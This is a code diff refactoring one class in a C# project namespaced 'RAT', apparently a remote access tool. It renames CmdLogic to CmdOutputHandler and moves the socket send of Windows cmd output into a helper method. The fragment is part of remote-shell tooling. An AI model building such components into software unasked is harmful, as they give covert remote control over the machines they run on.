@@ -1,6 +1,5 @@
 ﻿using RAT.src.Interfaces;
 using System.Diagnostics;
-using System.Net.Sockets;
 using System.Text;
 
 namespace RAT.src.Cmd
@@ -8,17 +7,17 @@ namespace RAT.src.Cmd
     /// <summary>
     /// Logic related to windows cmd.
     /// </summary>
-    public class CmdLogic : ICmdLogic
+    public class CmdOutputHandler : ICmdLogic
     {
-        private ISocketConnectionSendingLogic _socketConnectionSendingLogic { get; }
-        private ISocketStateLogic _stateLogic { get; }
+        private readonly ISocketConnectionSendingLogic _socketConnectionSendingLogic;
+        private readonly ISocketStateLogic _stateLogic;
 
         /// <summary>
         /// Logic related to cmd.
         /// </summary>
         /// <param name="sendingLogic">Socket sending logic.</param>
         /// <param name="stateLogic">Our client state logic.</param>
-        public CmdLogic(
+        public CmdOutputHandler(
             ISocketConnectionSendingLogic sendingLogic,
             ISocketStateLogic stateLogic)
         {
@@ -39,15 +38,10 @@ namespace RAT.src.Cmd
                 state.DataArray != null &&
                 !state.ClientCmdProcess.HasExited)
             {
-                string cleanCmd = CmdHelper.GetFormattedCmdForResponse(outLine.Data);
+                string cleanCmdMessage = CmdHelper.GetFormattedCmdForResponse(outLine.Data);
 
-                state.ClientSocket.BeginSend(
-                    Encoding.ASCII.GetBytes(cleanCmd),
-                    0,
-                    cleanCmd.Length,
-                    SocketFlags.None,
-                    _socketConnectionSendingLogic.OnSend,
-                    state.ClientSocket);
+                _socketConnectionSendingLogic.SendDataToClient(
+                    state.ClientSocket, Encoding.ASCII.GetBytes(cleanCmdMessage), _socketConnectionSendingLogic.OnMessageSend);
             }
         }
     }
